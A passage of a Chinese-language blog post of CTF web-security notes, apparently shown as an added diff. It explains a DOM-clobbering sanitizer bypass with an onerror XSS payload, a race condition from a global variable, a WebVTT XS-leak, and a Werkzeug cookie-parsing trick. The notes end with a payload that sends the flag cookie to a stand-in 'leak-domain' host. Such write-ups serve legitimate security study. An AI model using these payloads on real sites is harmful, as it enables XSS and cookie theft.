+        <span class="token punctuation">&#125;</span>
+
+        currentNode<span class="token punctuation">.</span>parentElement<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function-variable function">sanitize</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">let</span> currentNode<span class="token punctuation">;</span>
+        <span class="token keyword">var</span> dom_tree <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">parseFromString</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> <span class="token string">"text/html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">var</span> nodeIterator <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createNodeIterator</span><span class="token punctuation">(</span>dom_tree<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>currentNode <span class="token operator">=</span> nodeIterator<span class="token punctuation">.</span><span class="token function">nextNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+
+            <span class="token comment">// avoid DOMClobbering</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_isClobbered</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">typeof</span> currentNode<span class="token punctuation">.</span>nodeType <span class="token operator">!==</span> <span class="token string">"number"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">removeNode</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token keyword">continue</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+
+            <span class="token keyword">switch</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">.</span>nodeType<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">case</span> currentNode<span class="token punctuation">.</span><span class="token constant">ELEMENT_NODE</span><span class="token operator">:</span>
+                    <span class="token keyword">var</span> tag_name   <span class="token operator">=</span> currentNode<span class="token punctuation">.</span>nodeName<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token keyword">var</span> attributes <span class="token operator">=</span> currentNode<span class="token punctuation">.</span>attributes<span class="token punctuation">;</span>
+
+                    <span class="token comment">// avoid mXSS</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span>currentNode<span class="token punctuation">.</span>namespaceURI <span class="token operator">!==</span> <span class="token string">"http://www.w3.org/1999/xhtml"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">removeNode</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token keyword">continue</span><span class="token punctuation">;</span>
+
+                    <span class="token comment">// sanitize tags</span>
+                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">ALLOWED_TAGS</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>tag_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">removeNode</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                        <span class="token keyword">continue</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">&#125;</span>
+
+                    <span class="token comment">// sanitize attributes</span>
+                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> attributes<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">ALLOWED_ATTS</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>attributes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">removeNode</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                            <span class="token keyword">continue</span><span class="token punctuation">;</span>
+                        <span class="token punctuation">&#125;</span>
+                    <span class="token punctuation">&#125;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token keyword">return</span> dom_tree<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>內容有參考許多其他的 sanitizer library，像是 DOMPurify 等等。</p>
+<p>這題的關鍵是以往對於 form 的 DOM clobber，都是像這樣：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>理所當然地把元素放在 form 裡面，就可以污染 <code>test.x</code>。</p>
+<p>但其實還有一招是使用 <code>form</code> 屬性，就可以把元素放在外面：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">form</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>test</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>這一題的 sanitizer 在移除元素時，是這樣做的：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function-variable function">removeNode</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">currentNode</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> parentNode <span class="token operator">=</span> currentNode<span class="token punctuation">.</span>parentNode<span class="token punctuation">;</span>
+    <span class="token keyword">const</span> childNodes <span class="token operator">=</span> currentNode<span class="token punctuation">.</span>childNodes<span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>childNodes <span class="token operator">&amp;&amp;</span> parentNode<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">const</span> childCount <span class="token operator">=</span> childNodes<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
+
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> childCount <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            parentNode<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>
+                childNodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">cloneNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+                currentNode<span class="token punctuation">.</span>nextSibling
+            <span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+
+    currentNode<span class="token punctuation">.</span>parentElement<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>把要刪除的元素底下的 node，都插入到 parent 的 nextSibling 去。</p>
+<p>因此，如果 clobber 了 nextSibling，製造出這樣的結構：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">form</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>test</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>nextSibling</span><span class="token punctuation">></span></span> 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>test</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>nodeName</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>就會在移除 <code>&lt;form&gt;</code> 時，把底下的節點都插入到 <code>&lt;input form=test name=nextSibling&gt;</code> 後面，藉此繞過 sanitizer。</p>
+<p>真有趣的題目！雖然知道有 <code>form</code> 這個屬性，但還沒想過可以拿來搭配 DOM clobbering。</p>
+<p>作者的 writeup：<a target="_blank" rel="noopener" href="https://twitter.com/kevin_mizu/status/1701922141791211776">https://twitter.com/kevin_mizu/status/1701922141791211776</a></p>
+<h2><span id="lakectf-2023-geoguessy">LakeCTF 2023 GeoGuessy</span></h2><p>來源是參考這篇 writeup：<a target="_blank" rel="noopener" href="https://www.xanhacks.xyz/p/lakectf2023-geoguessy/">XSS, Race Condition, XS-Leaks and CSP &amp; iframe’s sandbox bypass - LakeCTF 2023 GeoGuessy</a></p>
+<p>先來看兩個有趣的 unintended，第一個是利用 cookie 不看 port 的特性，用其他題目的 XSS 來拿到 cookie，不同題目之間如果沒有隔離好就會這樣，例如說 <a target="_blank" rel="noopener" href="https://blog.maple3142.net/2023/08/27/sekai-ctf-2023-writeups/#leakless-note">SekaiCTF 2023 - leakless note</a> 也是。</p>
+<p>第二個是寫 code 的 bad practice 造成的 race condition。</p>
+<p>在訪問頁面時會去設定 user，這邊的 user 是 global variable：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    user <span class="token operator">=</span> <span class="token keyword">await</span> db<span class="token punctuation">.</span><span class="token function">getUserBy</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>cookies<span class="token operator">?.</span>token<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+         isPremium <span class="token operator">=</span> user<span class="token punctuation">.</span>isPremium
+        username <span class="token operator">=</span> user<span class="token punctuation">.</span>username
+        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'home'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> isPremium<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然後 update user 時也是用類似的模式，拿到 user 之後修改資料寫入：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/updateUser'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    token <span class="token operator">=</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token string">"token"</span><span class="token punctuation">]</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        user <span class="token operator">=</span> <span class="token keyword">await</span> db<span class="token punctuation">.</span><span class="token function">getUserBy</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            enteredPremiumPin <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">[</span><span class="token string">"premiumPin"</span><span class="token punctuation">]</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>enteredPremiumPin <span class="token operator">==</span> premiumPin<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                user<span class="token punctuation">.</span>isPremium <span class="token operator">=</span> <span class="token number">1</span>
+            <span class="token punctuation">&#125;</span>
+            <span class="token comment">// ...</span>
+            <span class="token keyword">await</span> db<span class="token punctuation">.</span><span class="token function">updateUserByToken</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> user<span class="token punctuation">)</span>
+            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token string">'yes ok'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token string">'no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>admin bot 每次都會執行 updateUser，把 admin user 的 isPremium 設定成 1。</p>
+<p>由於 user 是 global variable，db 的操作又是 async 的，所以如果速度夠快的話，updateUser 裡的 user 會是另一個 user，就可以把自己的 user 設定成 premium account。</p>
+<p>intended 的話是用 Scroll to Text Fragment (STTF) 來解。</p>
+<h2><span id="n1ctf-ytiruces">N1CTF - ytiruces</span></h2><p>參考資料：</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://dem0dem0.top/2023/10/20/n1ctf2023/">https://dem0dem0.top/2023/10/20/n1ctf2023/</a></li>
+<li><a target="_blank" rel="noopener" href="https://nese.team/posts/n1ctf2023/">https://nese.team/posts/n1ctf2023/</a></li>
+</ol>
+<p>用 WebVTT，一個顯示字幕的格式搭配 CSS selector  <code>video::cue(v[voice^=&quot;n1&quot;])</code> 來 xsleak。</p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/CSS/::cue">https://developer.mozilla.org/en-US/docs/Web/CSS/::cue</a></p>
+<p>真是有趣的 selector。</p>
+<h2><span id="werkzeug-cookie-parsing-quirks">Werkzeug cookie parsing quirks</span></h2><p>來源：<a target="_blank" rel="noopener" href="https://mizu.re/post/another-html-renderer">Another HTML Renderer</a></p>
+<p>這題又是來自於 <a target="_blank" rel="noopener" href="https://twitter.com/kevin_mizu">@kevin_mizu</a>，前面已經有介紹過兩題他出的題目了，而這題又是一個有趣的題目！</p>
+<p>這題有一個 admin bot 會設定 cookie，裡面有 flag，所以目標就是偷到這個 cookie，而核心程式碼如下：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/render"</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    settings <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        settings <span class="token operator">=</span> loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"settings"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span> <span class="token keyword">pass</span>
+
+    <span class="token keyword">if</span> settings<span class="token punctuation">:</span>
+        res <span class="token operator">=</span> make_response<span class="token punctuation">(</span>render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span>
+            backgroundColor<span class="token operator">=</span>settings<span class="token punctuation">[</span><span class="token string">"backgroundColor"</span><span class="token punctuation">]</span> <span class="token keyword">if</span> <span class="token string">"backgroundColor"</span> <span class="token keyword">in</span> settings <span class="token keyword">else</span> <span class="token string">"#ffde8c"</span><span class="token punctuation">,</span>
+            textColor<span class="token operator">=</span>settings<span class="token punctuation">[</span><span class="token string">"textColor"</span><span class="token punctuation">]</span> <span class="token keyword">if</span> <span class="token string">"textColor"</span> <span class="token keyword">in</span> settings <span class="token keyword">else</span> <span class="token string">"#000000"</span><span class="token punctuation">,</span>
+            html<span class="token operator">=</span>settings<span class="token punctuation">[</span><span class="token string">"html"</span><span class="token punctuation">]</span> <span class="token keyword">if</span> <span class="token string">"html"</span> <span class="token keyword">in</span> settings <span class="token keyword">else</span> <span class="token string">""</span>
+        <span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        res <span class="token operator">=</span> make_response<span class="token punctuation">(</span>render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> backgroundColor<span class="token operator">=</span><span class="token string">"#ffde8c"</span><span class="token punctuation">,</span> textColor<span class="token operator">=</span><span class="token string">"#000000"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        res<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">"settings"</span><span class="token punctuation">,</span> <span class="token string">"&#123;&#125;"</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> res<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Python 這邊主要會根據 cookie 內的參數來 render 頁面，template 如下：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span>
+  <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>render<span class="token punctuation">"</span></span>
+  <span class="token attr-name">sandbox</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span>
+  <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;style>* &#123; text-align: center; &#125;&lt;/style>&#123;&#123;html&#125;&#125;<span class="token punctuation">"</span></span>
+  <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>70%<span class="token punctuation">"</span></span>
+  <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>500px<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>就算控制了 html，也只能在 sandbox iframe 裡面，不能執行程式碼，也不是 same origin。但以往如果要偷 cookie 的話，基本上都需要先有 same-origin 的 XSS 才行。</p>
+<p>而前端的部分可以設定 cookie，但會過濾掉 <code>html</code> 這個字，所以不讓你設定 html：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">saveSettings</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">settings</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">settings=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>settings<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">const</span> <span class="token function-variable function">getSettings</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">d</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+        s <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">delete</span> s<span class="token punctuation">.</span>html<span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">while</span> <span class="token punctuation">(</span>d <span class="token operator">!=</span> d<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"html"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            d <span class="token operator">=</span> d<span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"html"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">return</span> d<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> params <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"settings"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        window<span class="token punctuation">.</span>settings <span class="token operator">=</span> <span class="token function">getSettings</span><span class="token punctuation">(</span>params<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"settings"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">saveSettings</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>settings<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">renderSettings</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>settings<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        window<span class="token punctuation">.</span>settings <span class="token operator">=</span> <span class="token function">getCookie</span><span class="token punctuation">(</span><span class="token string">"settings"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    window<span class="token punctuation">.</span>settings <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>settings<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>那這題到底要怎麼解呢？這一切都與 werkzeug 解析 cookie 時的邏輯有關。</p>
+<p>先來講如何繞過那個 html 的檢查，在 werkzeug 裡面如果你的 cookie value 是用 <code>&quot;&quot;</code> 包住的話，會先進行 decode，因此 <code>&quot;\150tml&quot;</code>  會被 decode 成 <code>&quot;html&quot;</code>，就可以繞過對於 html 關鍵字的檢查。</p>
+<p>但繞過之後，要怎麼拿到 flag 呢？這就要用到 werkzeug 第二個解析 cookie 的特殊之處了。當 werkzeug 在解析 cookie 時，如果碰到 <code>&quot;</code> 時，就會解析到下一個 <code>&quot;</code> 為止。</p>
+<p>舉例來說，假設 cookie 的內容是這樣：</p>
+<pre class="line-numbers language-none"><code class="language-none">Cookie: cookie1&#x3D;&quot;abc; cookie2&#x3D;def&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>最後得到的結果會是：<code>&quot;cookie1&quot;: &quot;abc; cookie2=def&quot;</code></p>
+<p>也就是說，如果我們在 flag 的前後各夾一個 cookie，就可以讓 flag 包含在 html 裡面，讓 flag 的內容出現在 html 中，再用其他任何方式把 cookie 拿走，底下直接用作者的 payload：</p>
+<pre class="line-numbers language-none"><code class="language-none">Cookie: settings&#x3D;&quot;&#123;\&quot;\150tml\&quot;: &quot;&lt;img src&#x3D;&#39;https:&#x2F;&#x2F;leak-domain&#x2F;?cookie&#x3D; ;flag&#x3D;GH&#123;FAKE_FLAG&#125;; settings&#x3D;&#39;&gt;\&quot;&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
